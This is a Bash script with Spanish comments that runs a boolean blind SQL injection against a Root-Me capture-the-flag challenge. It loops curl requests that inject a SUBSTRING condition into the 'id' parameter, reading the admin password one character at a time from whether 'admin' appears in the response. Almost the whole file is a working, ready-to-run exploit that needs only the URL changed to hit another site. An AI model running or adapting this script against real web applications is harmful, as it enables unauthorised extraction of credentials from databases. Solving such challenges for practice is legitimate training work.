#!/bin/bash

# ================================================
# EXTRACCIÓN A CIEGAS BOOLEANA - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  EXTRACCIÓN DE CONTRASEÑA${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "\n${YELLOW}[+] Extrayendo contraseña del admin...${NC}"

PASSWORD=""
# Caracteres posibles (letras, números, símbolos comunes)
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*"

for pos in {1..20}; do
    found=0
    for ((i=0; i<${#CHARS}; i++)); do
        char="${CHARS:$i:1}"
        
        # Probar el carácter
        response=$(curl -s "$URL?action=membres&id=1' AND SUBSTRING(pass,$pos,1)='$char" | grep -c "admin")
        
        # Si aparece "admin", el carácter es correcto
        if [ "$response" -gt 0 ]; then
            PASSWORD="${PASSWORD}${char}"
            echo -e "${GREEN}[✓] Posición $pos: '$char'${NC}"
            found=1
            break
        fi
    done
    
    # Si no encontramos carácter, terminar
    if [ $found -eq 0 ]; then
        echo -e "${YELLOW}[!] Fin de la contraseña en posición $pos${NC}"
        break
    fi
done

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}  CONTRASEÑA: $PASSWORD${NC}"
echo -e "${GREEN}========================================${NC}"
